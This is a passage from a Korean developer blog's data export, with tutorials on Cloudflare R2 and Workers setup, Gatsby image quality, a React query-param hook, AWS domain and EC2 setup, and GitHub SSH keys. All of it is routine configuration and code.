maintained. Please use @rollup/plugin-inject.\n[2/4] 🚚  Fetching packages...\n[3/4] 🔗  Linking dependencies...\nwarning \" > ts-loader@9.4.1\" has unmet peer dependency \"webpack@^5.0.0\".\n[4/4] 🔨  Building fresh packages...\n....\n✨  Done in 19.39s.\n```\n\n설치가 잘 되면 다음과 같이 테스트 해본다.\n\n```\n > yarn wrangler\nyarn run v1.22.19\n$ x/node_modules/.bin/wrangler\nwrangler\n\nCommands:\n  wrangler docs [command]              📚 Open wrangler's docs in your browser\n  wrangler init [name]                 📥 Initialize a basic Worker project, including a wrangler.toml file\n  wrangler generate [name] [template]  ✨ Generate a new Worker project from an existing Worker template. See https://github.com/cloudflare/templates\n  wrangler dev [script]                👂 Start a local server for developing your worker\n  wrangler publish [script]            🆙 Publish your Worker to Cloudflare.\n  wrangler delete [script]             🗑  Delete your Worker from Cloudflare.\n  wrangler tail [worker]               🦚 Starts a log tailing session for a published Worker.\n  wrangler secret                      🤫 Generate a secret that can be referenced in a Worker\n  wrangler secret:bulk <json>          🗄️  Bulk upload secrets for a Worker\n  wrangler kv:namespace                🗂️  Interact with your Workers KV Namespaces\n  wrangler kv:key                      🔑 Individually manage Workers KV key-value pairs\n  wrangler kv:bulk                     💪 Interact with multiple Workers KV key-value pairs at once\n  wrangler pages                       ⚡️ Configure Cloudflare Pages\n  wrangler queues                      🇶 Configure Workers Queues\n  wrangler r2                          📦 Interact with an R2 store\n  wrangler dispatch-namespace          📦 Interact with a dispatch namespace\n  wrangler d1                          🗄  Interact with a D1 database\n  wrangler pubsub                      📮 Interact and manage Pub/Sub Brokers\n  wrangler login                       🔓 Login to Cloudflare\n  wrangler logout                      🚪 Logout from Cloudflare\n  wrangler whoami                      🕵️  Retrieve your user info and test your auth config\n  wrangler types                       📝 Generate types from bindings & module rules in config\n  wrangler deployments                 🚢 Displays the 10 most recent deployments for a worker\n\nFlags:\n  -c, --config   Path to .toml configuration file  [string]\n  -e, --env      Environment to use for operations and .env files  [string]\n  -h, --help     Show help  [boolean]\n  -v, --version  Show version number  [boolean]\n✨  Done in 1.23s.\n```\n\n<br>\n\n#### 4-2. Wrangler 콘솔 로그인\n\n다음은 콘솔에서 로그인 해준다. (y 입력해주면 된다.)\n\n![](/img07.png)\n\n그럼 브라우저 열리고 Allow 해준다.\n\n![](/img08.png)\n\n다 해주면 브라우저가 이제 준비되었다고 알려준다.\n\n![](/img09.png)\n\n인증이 되면 아래와 같이 사용자에게 질의를 한다.\n\n![](/img10.png)\n\n질문 내용이 사용자 메트릭(?)을 클라우드 플레어에 제공할거냐 묻는데 난 거절했다.(아마 사용자 피드백이나 유저 데이터 수집용일것으로 사료됨)\n\n<br>\n\n#### 4-3. 버킷 생성\n\n다음의 명령어를 쳐서 버킷을 생성해준다.\n\n```\n> yarn wrangler r2 bucket create [bucket name]\n\n> yarn wrangler r2 bucket create lucky-num-dev\nyarn run v1.22.19\n$ x/node_modules/.bin/wrangler r2 bucket create lucky-num-dev\n ⛅️ wrangler 2.8.1\n-------------------\nCreating bucket lucky-num-dev.\nCreated bucket lucky-num-dev.\n✨  Done in 6.90s.\n```\n\n![](/img11.png)\n\n나는 lucky-num-dev 이라는 이름으로 만들어줬다.\n\n그리고 다음의 명령어를 통해 잘 생성되었는지 확인해준다.\n\n```\n> yarn wrangler r2 bucket list\n\n> yarn wrangler r2 bucket list\nyarn run v1.22.19\n$ x/node_modules/.bin/wrangler r2 bucket list\n[\n  {\n    \"name\": \"lucky-num-dev\",\n    \"creation_date\": \"2023-01-27T13:29:58.769Z\"\n  }\n]\n✨  Done in 1.74s.\n```\n\n![](/img12.png)\n\n<br>\n\n### 5. Workers 생성\n\nCloudFlare의 대시보드로 이동해서 사이드 메뉴의 **Workers**를 선택한다.\n\n![](/img13.png)\n\nWorkers도 무료/유료 요금제로 나눠져있는데 무료로 써도 충분하다. (물론 서비스 커지면 유료로...)\n\n하위도메인이란 것을 입력해야 하는데 쉽게 url 접근할 때 이름이다.  \n이미지의 하단에 보면 my-worker 해서 설명 보면 주소가 예시로 표시된다.\n\n![](/img14.png)\n\n<br>\n\n일단 무료 요금제를 선택한다.\n\n![](/img15.png)\n\n<br>\n\n생성이 되면 아래의 계정 ID를 잘 확인해둔다.  \n근데 어짜피 CLI 툴에서 또 확인할 수 있다.\n\n![](/img16.png)\n\n<br>\n\n이제 서비스 생성을 해야 하는데 여기도 대시보드에서 가능하지만, 난 **Wrangler CLI**로 콘솔에서 생성하였다.  \n취향차이인데 편한대로 해보자.\n\n아까 맨 위에서 **wrangler** 실행하면 나온 명령어 중 아래와 같은 것이 있다.\n\n```\nwrangler init [name] 📥 Initialize a basic Worker project, including a wrangler.toml file\n```\n\n아래와 같이 실행해준다.\n\n![](/img17.png)\n\n여기서 물어보는것이 서비스 자체에 package.json을 두고 관리할 것인지를 묻는건데 난 프로젝트 내에서 같이 사용할 것이라서 **N**을 선택했다.  \n만약 외부에서 따로 관리하거나 할 경우 **y**를 선택해서 사용하자.\n\n즉 쉽게 worker 서비스는 위 링크에 들어가서 확인한 것처럼 **서버리스**를 위한 서비스이고, 그냥 수행할 코드 조각이다.  \n그래서 이것을 **worker에 배포하는 작업을 하는 프로젝트**라 보면 된다.  \n근데 하는 역할이 그냥 코드 조각 수정이나 배포밖에 없고, 또 프로젝트랑 같이 사용하는것이라서 나는 프로젝트 내에 넣어서 사용했다.\n\n궁금하면 따로 만들어서 해보고 하면 이해가 될 것이다.  \n그래도 이해가 안되면 따로 찾아보거나 댓글로...\n\n무튼 다시 이어나가자면...\n\n위 명령어까지 수행하면 아래와 같이 폴더가 하나 프로젝트 디렉토리에 생성되며 **wrangler.toml** 파일이 추가된다.\n\n![](/img18.png)\n\n여기까지 한 다음에 계정의 정보를 알아야 하는데 대시보드에서도 볼 수 있지만 아래의 명령어를 통해서 볼 수 있다.\n\n```\n> yarn wrangler whoami\nyarn run v1.22.19\n$ x/node_modules/.bin/wrangler whoami\n ⛅️ wrangler 2.8.1\n-------------------\nGetting User settings...\n👋 You are logged in with an OAuth Token, associated with the email test@test.com!\n┌─────────────────────────────────┬──────────────────────────────────┐\n│ Account Name                    │ Account ID                       │\n├─────────────────────────────────┼──────────────────────────────────┤\n│ test@test.com's Account         │ 12345677880                      │\n└─────────────────────────────────┴──────────────────────────────────┘\n🔓 Token Permissions: If scopes are missing, you may need to logout and re-login.\nScope (Access)\n- account (read)\n- user (read)\n- workers (write)\n- workers_kv (write)\n- workers_routes (write)\n- workers_scripts (write)\n- workers_tail (read)\n- d1 (write)\n- pages (write)\n- zone (read)\n- offline_access\n✨  Done in 2.42s.\n```\n\n![](/img19.png)\n\n이제 위 정보를 토대로 **wrangler.toml** 파일을 수정해야 한다.\n\n파일을 열면 아래의 정보만 기입되어 있을 것이다.\n\n```toml\nname = \"[아까 wrangler init 에서 입력한 이름]\"\ncompatibility_date = \"2023-01-28\"\n```\n\n여기를 아래처럼 수정해준다.\n\n```toml\nname = \"luckynum_dev\"\nmain = \"index.ts\"\ncompatibility_date = \"2023-01-28\"\n\naccount_id = \"12345677880\"\n\nworkers_dev = true\n\n[vars]\nAUTH_KEY_SECRET = \"key-key\"\n\n[[r2_buckets]]\nbinding = \"MY_BUCKET\"\nbucket_name = \"lucky-num-dev\"\n```\n\n그리고 해당 toml이 있는 디렉토리에 index.ts 파일을 하나 생성해준다.  \n이 파일의 경로는 위 **toml**파일의 **main**항목과 연계된다.  \n경로 또는 파일명을 바꾸고 싶다면 저 **toml**과 함께 수정 처리하면 된다.\n\n내가 작성한 코드는 아래와 같다.\n\n```typescript\nexport interface Env {\n  DEV_BUCKET: R2Bucket\n}\n\nconst hasValidHeader = (request, env) => {\n  return request.headers.get(\"X-Auth-Key\") === env.AUTH_KEY_SECRET\n}\n\nfunction authorizeRequest(request, env, key) {\n  switch (request.method) {\n    case \"PUT\":\n    case \"DELETE\":\n    case \"GET\":\n      return hasValidHeader(request, env)\n  }\n}\n\nfunction parseRange(\n  encoded: string | null\n): undefined | { offset: number; length: number } {\n  if (encoded === null) {\n    return\n  }\n\n  const parts = encoded.split(\"bytes=\")[1]?.split(\"-\") ?? []\n  if (parts.length !== 2) {\n    throw new Error(\n      \"Not supported to skip specifying the beginning/ending byte at this time\"\n    )\n  }\n\n  return {\n    offset: Number(parts[0]),\n    length: Number(parts[1]) + 1 - Number(parts[0]),\n  }\n}\n\nfunction objectNotFound(objectName: string): Response {\n  return new Response(\n    `<html><body>R2 object \"<b>${objectName}</b>\" not found</body></html>`,\n    {\n      status: 404,\n      headers: {\n        \"content-type\": \"text/html; charset=UTF-8\",\n      },\n    }\n  )\n}\n\nfunction isNullOrUndefine(x: any) {\n  if (x == null) {\n    return false\n  }\n  if (x === null) {\n    return false\n  }\n  if (typeof x === \"undefined\") {\n    return false\n  }\n  return true\n}\n\nexport default {\n  async fetch(request: Request, env: Env): Promise<Response> {\n    const url = new URL(request.url)\n    const objectName = url.pathname.slice(1)\n    if (!authorizeRequest(request, env, objectName)) {\n      return new Response(\"Forbidden\", { status: 403 })\n    }\n\n    switch (request.method) {\n      case \"PUT\":\n        const uploadObj = await env.DEV_BUCKET.put(objectName, request.body, {\n          httpMetadata: request.headers,\n        })\n\n        const resultJson = JSON.stringify({\n          uploaded: isNullOrUndefine(uploadObj[\"uploaded\"])\n            ? uploadObj[\"uploaded\"]\n            : \"-\",\n          etag: isNullOrUndefine(uploadObj[\"httpEtag\"])\n            ? uploadObj[\"etag\"]\n            : \"-\",\n          size: isNullOrUndefine(uploadObj[\"size\"]) ? uploadObj[\"size\"] : \"-\",\n          version: isNullOrUndefine(uploadObj[\"version\"])\n            ? uploadObj[\"version\"]\n            : \"-\",\n          key: isNullOrUndefine(uploadObj[\"key\"]) ? uploadObj[\"key\"] : \"-\",\n        })\n\n        return new Response(resultJson, {\n          headers: {\n            etag: uploadObj.httpEtag,\n          },\n        })\n      case \"GET\":\n        const object = await env.DEV_BUCKET.get(objectName)\n        if (!object) {\n          return new Response(\n            JSON.stringify({ status: \"fail\", message: \"Object Not Found\" }),\n            { status: 404 }\n          )\n        }\n        return new Response(object.body)\n      case \"DELETE\":\n        await env.DEV_BUCKET.delete(objectName)\n        return new Response(JSON.stringify({ status: \"success\" }), {\n          status: 200,\n        })\n\n      default:\n        return new Response(\n          JSON.stringify({ status: \"fail\", message: \"Method Not Allowed\" }),\n          { status: 405 }\n        )\n    }\n  },\n}\n```\n\n몇몇 죽은 코드가 있는데 필요에 맞게 커스텀 해서 쓰면 될듯 하다.\n\n<br>\n\n### 6. 암호키 만들기\n\n이제 worker와 통신할 때 쓸 암호키를 만들어줘야 한다.\n콘솔 CLI에서 아래와 같은 명령어를 봤을 것이다.\n\n> wrangler secret 🤫 Generate a secret that can be referenced in a Worker\n\n그렇다면 이제 만들어준다.\n\n```\n> yarn wrangler secret put lucky_key -c ./luckynum_dev/wrangler.toml\nyarn run v1.22.19\n$ X/node_modules/.bin/wrangler secret put lucky_key -c ./luckynum_dev/wrangler.toml\n ⛅️ wrangler 2.8.1\n-------------------\n✔ Enter a secret value: … ********************\n🌀 Creating the secret for the Worker \"luckynum_dev\"\n✨ Success! Uploaded secret lucky_key\n✨  Done in 57.18s.\n```\n\n![](/img20.png)\n\n<br>\n\n여기서 입력한 암호는 위 **toml**에서 **AUTH_KEY_SECRET**이 값과 같아야 한다.  \n그리고 이 값은 향후 헤더에 넣어서 보내야 하는 값이다.\n\n<br>\n\n### (번외) 서비스 대시보드로 생성법\n\n만약 CLI가 좀 어렵다면 대시보드로도 가능하다.  \n사람마다 다르지만 사실 GUI로 하는게 더 편하고 좋다.\n\n아까 대시보드에서 서비스 생성을 누르면 아래와 같이 뜬다.\n\n![](/img21.png)\n\n서비스 이름을 원하는 것으로 작성한다.  \n그리고 아래 **스타터 선택**은 해당 워커로 접근 시 처리할 코드 조각인데 다른거 건들지말고 **HTTP 처리기**를 선택하고 진행한다.  \n어짜피 위에서 작성한 **index.ts**파일로 수행할 것이라서 서비스 생성을 진행한다.\n\n![](/img22.png)\n\n그럼 서비스가 생성되고 아래와 같이 서비스에 대한 요약 내용이 나온다.\n\n<br>\n\n### 정리\n\n여기까지가 준비 과정이었다.  \n좀 복잡하고 과정이 길었는데 천천히 하다보면 어렵지 않게 할 수 있다.  \n혹여나 이해가 안되거나 문제가 있고, 해결하기 어려운 경우 댓글을 통해 공유주시면 같이 해결해 볼 수 있도록 노력해보겠다.\n\n다음은 **Nest.JS**에서 파일 업로드, 다운로드, 삭제 등을 구현해볼 예정이다.\n\n아래의 포스팅은 Nest.Js에서 구현한 부분을 다룬다.\n\n[CloudFlare R2 사용해보기 Part 2 (With Nest.Js)](https://elfinlas.github.io/nest_js/230203_r2_nestjs/)\n\n<br>\n\n### 참고\n\n- [Wrangler 설치법](https://developers.cloudflare.com/workers/wrangler/install-and-update/)\n- [Wrangler CLI 사용 가이드](https://developers.cloudflare.com/workers/wrangler/)\n- [R2 사용 가이드](https://dash.cloudflare.com/af0fb192ecd83eade23b5f72b1677fc2/r2/overview/cli?from=overview)\n\n```toc\n\n```\n"},{"excerpt":"블로그 이미지가... 전부터 좀 거슬리긴 했는데 이미지를 올리면 디지털 열화라고 부르는, 아주 낮은 품질의 이미지가 보이기 시작했다.  내가 올린 다른 컨텐츠의 썸네일 이미지인데 딱 봐도 품질 저하가 느껴진다. 이유야 알고 있었는데 해결해야지 하다가... 오래 끌었다. 일단 내가 쓰는 블로그는 Gatsby-starter-bee 이걸 약간 내 입맛에 살짝 …","fields":{"slug":"/gatsby/230124_image_quality/"},"frontmatter":{"date":"January 24, 2023","title":"Gatsby 블로그에서 이미지 열화(화질 저화) 문제 (With Gatsby-starter-bee theme)","description":null,"tags":["Gatsby"],"series":"Gatsby","previewImage":"gatsby_logo.png","isPrivate":null},"rawMarkdownBody":"\n![](../thumbnail.png)\n\n# 블로그 이미지가...\n\n전부터 좀 거슬리긴 했는데 이미지를 올리면 디지털 열화라고 부르는,  \n아주 낮은 품질의 이미지가 보이기 시작했다.\n\n![](/img01.png)\n\n내가 올린 다른 컨텐츠의 썸네일 이미지인데 딱 봐도 품질 저하가 느껴진다.  \n이유야 알고 있었는데 해결해야지 하다가...  \n오래 끌었다.\n\n일단 내가 쓰는 블로그는 [Gatsby-starter-bee](https://github.com/JaeYeopHan/gatsby-starter-bee) 이걸 약간 내 입맛에 살짝 바꿔서 쓰고 있다.  \n그래서 다른 개츠비 테마나 또는 직접 만든 것의 경우 아래의 플러그인을 사용한다면 해당 방법이 유효할 것이다.\n\n<br>\n\n## How to?\n\n먼저 자신이 사용하는 테마나 또는 직접 만든 것이라면 **gatsby-remark-images** 플러그인을 수정하면 끝이다.  \n아래는 **Gatsby-starter-bee** 기준인데 다른 테마나 커스텀도 금방 찾을 수 있다.\n\n먼저 **gatsby-config.js**파일에서 아래의 부분을 찾아본다.\n\n```javascript\n{\n      resolve: `gatsby-transformer-remark`,\n      options: {\n        plugins: [\n          {\n            resolve: `gatsby-remark-katex`,\n            options: {\n              strict: `ignore`,\n            },\n          },\n          {\n            resolve: `gatsby-remark-images`,\n            options: {\n              maxWidth: 1200,\n              quality: 100,\n              withWebp: true,\n              //linkImagesToOriginal: false, (이건 미 사용 처리로 바꾸었다)\n            },\n          },\n          {\n            resolve: `gatsby-remark-images-medium-zoom`,\n            options: {\n              margin: 36,\n              scrollOffset: 0,\n\n            }\n          }\n        ]\n      }\n}\n```\n\n여기서 **resolve: `gatsby-remark-images`,** 영역의 옵션에서 퀄리티 값을 주면 된다.  \n근데 80을 줘봤는데 약간 열화가 심하고, 90도 살짝 나아진 느낌이라...  \n나의 경우 100을 줬다.\n\n그렇게 해서 다시 조회해보니...\n\n![](/img02.png)\n\n물론 내가 가진 원본의 경우 ARW 포멧의 25메가 짜리 파일이다...  \n당연 원본에서 리사이징하고 퀄을 낮추니 저렇게 별로지만...그래도 처음보다는 결과가 좋다.\n\n단점은 이미지가 로딩이 늦어진다는 점이 있지만,  \n돌려보니 자동으로 블러 처리 해주면서 로딩을 하기에 큰 거슬림은 없었다.\n\n이 블로그가 사진 컨텐츠 블로그면 조금 심각할 수 있겠지만...  \n이건 나중에 내 개인 사진 전시 블로그를 만들 때 다시 고민해볼 문제인 듯 싶다.\n\n일단은 여기서 만족한다.\n\n<br>\n\n## 참고\n\n[StackOverflow](https://github.com/gatsbyjs/gatsby/issues/3984)\n\n```toc\n\n```\n"},{"excerpt":"맥에서 tree 명령을... 깃헙(Github) 같은데에 Readme에 트리 구조를 올리려고 명령어를 쳤는데...  명령어를 찾을 수 없다고 떴다. 그래서 brew에서 인스톨 해봤는데...  설치가 실패해서 자세히 보니... M1이라서 아키텍처를 바꾸고 해야 했다. 나온대로 명령어를 다시 쳤더니 잘 되었다.","fields":{"slug":"/mac/230119_install_tree/"},"frontmatter":{"date":"January 19, 2023","title":"Mac에서 tree 명령어 사용하기 (M1 Mac)","description":null,"tags":["Mac"],"series":"Mac","previewImage":"how.png","isPrivate":null},"rawMarkdownBody":"\n# 맥에서 tree 명령을...\n\n깃헙(Github) 같은데에 Readme에 트리 구조를 올리려고 명령어를 쳤는데...\n\n![](/img01.png)\n\n명령어를 찾을 수 없다고 떴다.\n\n그래서 **brew**에서 인스톨 해봤는데...\n\n![](/img02.png)\n\n설치가 실패해서 자세히 보니...  \nM1이라서 아키텍처를 바꾸고 해야 했다.\n\n```\narch -arm64 brew install tree\n```\n\n나온대로 명령어를 다시 쳤더니 잘 되었다.\n"},{"excerpt":"React에서... 이번에 프리온보딩을 하면서 과제를 하다가 페이징 이동을 하고 쿼리를 지워줘야 할 로직이 필요했다. 예를 들면 위와 같이 url 파라메터가 왔을 때 뒤의 code... 부터 지워서 사용자에게 안보이게 해주고 싶었다. 결과는 이렇게? Next.Js에서는 전에 짜둔 코드가 있었는데, React 에서는 해당 방법을 사용할 수 없었다. 당연한게…","fields":{"slug":"/react/230119_react_remove_query_param/"},"frontmatter":{"date":"January 19, 2023","title":"React에서 Query param 지우기 (With React Hook)","description":null,"tags":["ReactJS"],"series":"ReactJS","previewImage":"react_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_react.png)\n\n# React에서...\n\n이번에 프리온보딩을 하면서 과제를 하다가 페이징 이동을 하고 쿼리를 지워줘야 할 로직이 필요했다.\n\n```\n/user/main?code=logout\n```\n\n예를 들면 위와 같이 url 파라메터가 왔을 때 뒤의 code... 부터 지워서 사용자에게 안보이게 해주고 싶었다.  \n결과는 이렇게?\n\n```\n/user/main\n```\n\nNext.Js에서는 전에 짜둔 코드가 있었는데, **React** 에서는 해당 방법을 사용할 수 없었다.\n\n당연한게 Next.Js에서는 **Link**라는 훌륭한 것이 있지만, **React**에는 없다.  \n그래서 직접 찾아서 구현해야 했다.\n\n## 어떻게?\n\n그냥 커스텀 훅을 만들어서 썼다.\n\n```typescript\nimport { useEffect } from \"react\"\nimport { useSearchParams } from \"react-router-dom\"\n\ninterface UseQueryRemoverProps {\n  query: string\n  excuteFunc?: Function\n}\n\nexport default function useQueryRemover({\n  query,\n  excuteFunc,\n}: UseQueryRemoverProps) {\n  const [searchParam, setSearchParam] = useSearchParams()\n  useEffect(() => {\n    if (searchParam.has(query)) {\n      searchParam.delete(query)\n      setSearchParam(searchParam)\n      if (excuteFunc) {\n        excuteFunc()\n      }\n    }\n  }, [])\n}\n```\n\n파라메터로 지울 쿼리를 받고, 지운 뒤 실행함수를 옵셔널로 전달받는다.  \n다음과 같이 사용 한다.\n\n```tsx\nexport default function LoginSignUpPage() {\n    const [viewMode, setViewMode] = useState<AuthViewMode>(\n        AUTH_VIEW_MODE.LOGIN,\n    );\n\n    //쿼리를 지워준다.\n    useQueryRemover({\n        query: \"code\",\n        excuteFunc: () => {\n            Swal.fire({\n                title: \"로그아웃\",\n                html: \"로그아웃 되었습니다.\",\n                icon: \"success\",\n                confirmButtonText: \"확인\",\n            });\n        },\n    });\n\n    return (...)\n}\n```\n\n물론 이 **Hook**도 개선할 점이 있다.  \n만약 지울 파라메터가 여러개 일 경우에 대해 처리는 되어 있지 않다... (-\\_-;;)\n\n이 부분은 **Hook**의 전달인자 중 **query**부분을 string이 아니라 **string[]** 로 받은 다음,  \n이를 순회하며 하나씩 지우는 로직으로 바꾸면 될듯 하다...(맞겠지?)\n\n무튼 시간이 없어서 여기까지 로직을 작성하고 마무리 했다.\n\n<br>\n\n## 정리\n\n시간이 되면 Next.JS에서 처리하는 법과, 이 코드도 개선하여 재 포스팅을 할 예정이다.  \n이 로직은 [StackOverflow](https://stackoverflow.com/questions/62032050/how-to-remove-query-param-with-react-hooks)를 참고하였다.\n"},{"excerpt":"AWS에서 도메인사서 적용하기 현재 개발하고 있는 흑우집합소의 기능을 다 개발하지 않았지만... 일부 기능만 오픈해서 약간 홍보 겸 외부 테스트 겸... 무튼 이제 도메인을 사서 적용하는 부분을 기록해두려 한다. 도메인 쇼핑부터 제일 먼저 할 일은 도메인명을 정하는 것이다. (-_-;;) 생각보다 어렵다. 변수 짓기보다 약간 난이도 있는? 그래도 재미있다…","fields":{"slug":"/aws/230119_buy_domain/"},"frontmatter":{"date":"January 19, 2023","title":"Aws에서 도메인 구입 후 연결하기 (With 흑우집합소)","description":"직접 도메인 연결하기","tags":["Aws","Infra","흑우집합소"],"series":"Aws","previewImage":"aws_logo.webp","isPrivate":null},"rawMarkdownBody":"\n![](/thumbnail.png)\n\n# AWS에서 도메인사서 적용하기\n\n현재 개발하고 있는 흑우집합소의 기능을 다 개발하지 않았지만...  \n일부 기능만 오픈해서 약간 홍보 겸 외부 테스트 겸...\n\n무튼 이제 도메인을 사서 적용하는 부분을 기록해두려 한다.\n\n<br>\n\n## 도메인 쇼핑부터\n\n제일 먼저 할 일은 도메인명을 정하는 것이다. (-\\_-;;)  \n생각보다 어렵다.\n\n변수 짓기보다 약간 난이도 있는?  \n그래도 재미있다.  \n약간 게임 케릭터 이름 짓는 느낌일까나...\n\n무튼 이 도메인이 현재 사용하는 것인지 아닌지를 알기 위해서는  \n후이즈나 도메인 등록 서비스에서 알아보면 된다.\n\n![](/img01.png)\n\n내 서비스 이름은 흑우집합소이기 때문에 뭔가 관련된 걸로 해보려 했는데...  \n사실 유명하거나 괜찮은데? 라고 하는건 다 있다.\n\n그래서 찾다가...  \n아마존도 도메인 등록 서비스를 사용할 수 있다.\n\n![](/img02.png)\n\n내가 선택한 도메인은...  \n**bcow.world**로 했다.\n\n![](/img03.png)\n\n이렇게 추천도 해주지만...\n\n사실 다른거 할까 하다가...  \n흑우 = black cow => bcow  \n집합소 = station communi.. => world\n\n진짜 쓰잘대기 없는거로 고민 잘하는 1인이다. -\\_-;;  \n이거는 뭐 다른 곳에서 썰을 풀기로 하고...\n\n도메인을 구입해준다.  \n구입이야 제일 쉽다. (돈 쓰는건 항상 다 쉽다.)\n\n![](/img04.png)\n\n이렇게 도메인 구입자의 정보를 입력해준다.\n\n![](/img05.png)\n\n다 처리하면 대기 중으로 뜨게 되고,  \n위에서 입력한 이메일로 등록이 되면 알림이 온다.\n\n![](/img06.png)\n![](/img07.png)\n\n이렇게 이메일 검증 링크를 통해 검증을 확인해주고, 조금 기다린다.  \n그러면 아래와 같이 등록된 도메인으로 처리가 된다.\n\n![](/img08.png)\n\n<br>\n\n그 다음 **Route53**의 **DNS 관리**항목으로 이동한다.\n\n![](/img09.png)\n\n<br>\n\n등록된 도메인을 확인하고 클릭하여 선택한다.\n\n![](/img10.png)\n\n<br>\n \n그러면 아래와 같이 등록이 잘 되었을 것이다.  \n만약 후이즈나 다른곳에서 등록했다면 NS쪽을 다 맞춰줘야 하지만...  \n난 AWS에서 자동으로 등록이 되어 있다.\n\n![](/img11.png)\n\n<br>\n\n우측 상단의 레코드 생성을 클릭해준다.  \n그리고 아래의 정보를 입력해서 내 인스턴스와 연결을 해준다.\n\n![](/img12.png)\n\n- 레코드 이름\n  - 접두사를 붙여줄 수 있지만, 지금은 그냥 최상위 도메인만 등록하려 하기에 공백으로 둔다.\n- 레코드 유형\n  - 단순 트래픽 라우팅을 쓸 예정이기에 A-IPv4 선택해준다.\n- 값\n  - 인스턴스의 Public IP를 적어준다.\n- 기타\n  - 나머지는 따로 작업할 것 없이 그대로 둔다.\n\n<br>\n\n위와 같이 처리 후 레코드 생성을 해준다.  \n그리고 브라우저에서 접근해보면 해당 도메인으로 접근이 가능함을 확인할 수 있다.\n\n<br>\n\n### 정리\n\n이제 Https를 적용하고 nginx를 물려서 특정 포트로 라우팅 하는것만 남았다.  \n**LetsEncrypt**를 써서 Https 씌우는 것은 전에 포스팅 했다.\n\n참고하실 분은 [Lets Encrypt 적용하기](https://elfinlas.github.io/letsencrypt/220923_use-letsencrypt/) 여기로...\n\n```toc\n\n```\n"},{"excerpt":"이제 새롭게 시작할 서비스를 구성하며... 난 주로 EC2의 무료 플랜을 1년 굴려보고 희망이 보이면 그땐 제대로 하고, 그 외는 개발용으로 두고 종료한다. 이번에도 서비스를 올리려고 또 아마존에서 EC2 작업을 하다가 기록을 남긴다.\n먼저 AWS에 가입이 되어 있고, 계정이 다 있다는 가정하에 진행한다. 먼저 EC2 선택부터  난 Ubuntu가 편하여 …","fields":{"slug":"/aws/230119_ec2_start/"},"frontmatter":{"date":"January 19, 2023","title":"AWS EC2 프리티어 시작하기","description":"Aws EC2 프리티어","tags":["Aws","Ubuntu","EC2","Infra"],"series":"Aws","previewImage":"aws_logo.webp","isPrivate":null},"rawMarkdownBody":"\n![](/thumbnail.jpeg)\n\n# 이제 새롭게 시작할 서비스를 구성하며...\n\n난 주로 EC2의 무료 플랜을 1년 굴려보고 희망이 보이면 그땐 제대로 하고,  \n그 외는 개발용으로 두고 종료한다.\n\n이번에도 서비스를 올리려고 또 아마존에서 EC2 작업을 하다가 기록을 남긴다.\n먼저 AWS에 가입이 되어 있고, 계정이 다 있다는 가정하에 진행한다.\n\n## 먼저 EC2 선택부터\n\n![](/img01.png)\n\n난 Ubuntu가 편하여 LTS 버전으로 선택해줬다.  \n본인이 원하는 OS가 있다면 그것으로 해도 무방하다.\n\n![](/img02.png)\n\n그 다음은 인스턴스는 일단 프리티어에 맞는걸로 해준다.  \n서비스가 잘 되서 확장하는게 아닌 이상 일단 맛보기용으로 운영하기에도 스팩이 나쁘지 않다.\n\n키페어는 이 인스턴스에 접근할 때 쓸 공개/비밀 키를 생성하는 부분인데,  \n난 키 하나로 돌려 쓰는게 아니라 하나의 인스턴스 당 하나의 키를 소유하게끔 한다. (너무 당연한 이야기...-\\_-;;)\n\n![](/img03.png)\n\n보안그룹은 가급적 제한된 IP만 제공하는게 좋다.  \n나는 일단 ssh만 열어뒀다.\n\n![](/img04.png)\n\n스토리지는 10기가로 되어 있는데, 프리티어는 30기가까지 가능하기에 30을 맞춰준다.\n\n![](/img05.png)\n\n그 다음 큰 특이사항이 없다면 생성해준다.  \n그리고 혹시 모르니 결제 알림은 생성해준다.\n\n![](/img06.png)\n\n그리고 EC2 내역으로 와서 조금만 기다리면 인스턴스가 준비된다.\n\n![](/img07.png)\n\n이것을 연결하기 위해서는 연결 항목을 참고하면 되는데 아래와 같이 가이드 되어 있다.\n\n![](/img09.png)\n\n개인정보가 많아서 좀 많이 지워졌다 -\\_-;;  \n자세한 것은 아래에서 다루겠다.\n\n<br>\n\n## Local에서 접근하기\n\n아까 받은 pem 파일을 적당한 곳에 배치하고, 해당 파일의 권한을 바꿔줘야 한다.\n\n```\n$ chmod 400 ./my_key.pem\n```\n\n만약 권한을 조정하지 않고 사용할 경우 아래와 같은 에러를 받을 수 있다.\n\n![](/img10.png)\n\n권한 조정을 하고 아래 명령어를 통해서 접속할 수 있다.\n\n```\n# ssh -i [key 파일 경로와 파일명] [아까 aws에서 받은 계정명과 주소(이 부분은 연결 정보에서 확인 가능하다.)]\n\n$ ssh -i \"./my_key.pem\" user@.compute.amazonaws.com\n```\n\n난 이걸 shell로 짜서 그냥 한번에 접근하게 해둔다.  \n별건 아니고 위의 명령어를 **xxx.sh**로 만들어서\n\n> ./my_aws.sh\n\n이런식으로?\n\n<br>\n\n### 정리\n\n영양가 없는 포스팅이었지만...  \n또 잊을까봐 나를 위해서 정리한 포스팅으로 만족해야겠다.\n\n```toc\n\n```\n"},{"excerpt":"Clone을 받으려 하는데... 내 깃허브는 오픈된 프로젝트는 거의 관리를 안하고 보통 private repo만 주로 사용한다. 기여를 해야 겠지만 실력이... 무튼 private repo를 클론 받으려 하는데 자꾸 아래와 같이 에러를 뿜는다. 그래서 이를 찾아보고 해결한 방법을 포스팅으로 남겨둔다. 1. SSH Key 생성 먼저 Clone 받을 환경에서…","fields":{"slug":"/vcs_git/230118_git_ssh_key/"},"frontmatter":{"date":"January 18, 2023","title":"Github clone 받을 때 권한 문제 (git permission denied - publickey)","description":null,"tags":["Github"],"series":"Git","previewImage":"setting.png","isPrivate":null},"rawMarkdownBody":"\n# Clone을 받으려 하는데...\n\n내 깃허브는 오픈된 프로젝트는 거의 관리를 안하고 보통 private repo만 주로 사용한다.  \n기여를 해야 겠지만 실력이...\n\n무튼 private repo를 클론 받으려 하는데 자꾸 아래와 같이 에러를 뿜는다.\n\n```\ngit permission denied (publickey). fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists\n```\n\n그래서 이를 찾아보고 해결한 방법을 포스팅으로 남겨둔다.\n\n## 1. SSH Key 생성\n\n먼저 Clone 받을 환경에서 SSH Key가 필요하다.  \n여기에서는 **Ubuntu**를 기준으로 설명한다.  \n그런데 SSH 발급 받는 환경은 맥이나 윈도우나 비슷하기에...\n\n터미널에서 아래와 같은 명령어를 통래서 키를 발급받는다.\n\n```\n$ ssh-keygen -t rsa -C \"깃허브 아이디\"\n\n예시로 깃헙 id가 test@test.com 일 